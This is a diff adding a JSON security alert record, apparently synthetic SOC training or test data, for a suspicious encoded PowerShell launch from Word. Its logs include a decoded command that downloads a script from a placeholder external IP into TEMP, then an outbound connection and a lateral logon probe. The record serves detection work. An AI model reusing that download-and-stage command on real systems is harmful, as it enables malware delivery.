@@ -1,0 +1,56 @@
+{
+  "alert_id": "A-1003",
+  "name": "Suspicious PowerShell Execution",
+  "severity": "Medium",
+  "mitre": "T1059 - Command and Scripting Interpreter",
+  "kill_chain_phase": "Exploitation",
+  "description": "Base64 encoded PowerShell execution was detected on an endpoint.",
+  "rule": "IF base64 encoded PowerShell detected THEN trigger medium-severity script execution alert",
+  "logs": [
+    {
+      "timestamp": "2026-05-02T11:04:10+08:00",
+      "source_ip": "10.20.12.30",
+      "destination_ip": "10.20.12.30",
+      "user": "admin",
+      "action": "process_start",
+      "status": "success",
+      "raw_log": "edr host=OPS-WS-019 parent=winword.exe process=powershell.exe args=-NoP -EncodedCommand SQBFAFgA"
+    },
+    {
+      "timestamp": "2026-05-02T11:04:15+08:00",
+      "source_ip": "10.20.12.30",
+      "destination_ip": "10.20.12.30",
+      "user": "admin",
+      "action": "script_decode",
+      "status": "suspicious",
+      "raw_log": "scriptblock decoded=\"Invoke-WebRequest -Uri hxxp://203.0.113.90/a.ps1 -OutFile $env:TEMP\\a.ps1\""
+    },
+    {
+      "timestamp": "2026-05-02T11:04:19+08:00",
+      "source_ip": "10.20.12.30",
+      "destination_ip": "203.0.113.90",
+      "user": "admin",
+      "action": "outbound_connection",
+      "status": "success",
+      "raw_log": "netflow src=10.20.12.30 dst=203.0.113.90 dport=443 process=powershell.exe"
+    },
+    {
+      "timestamp": "2026-05-02T11:04:25+08:00",
+      "source_ip": "10.20.12.30",
+      "destination_ip": "10.20.40.12",
+      "user": "admin",
+      "action": "remote_admin_probe",
+      "status": "attempted",
+      "raw_log": "windows event=network_logon_attempt src=10.20.12.30 dst=10.20.40.12 user=admin status=failed"
+    },
+    {
+      "timestamp": "2026-05-02T11:04:34+08:00",
+      "source_ip": "10.20.12.30",
+      "destination_ip": "10.20.12.30",
+      "user": "admin",
+      "action": "alert_triggered",
+      "status": "true",
+      "raw_log": "rule=suspicious_powershell_execution host=OPS-WS-019 encoded_command=true severity=medium"
+    }
+  ]
+}
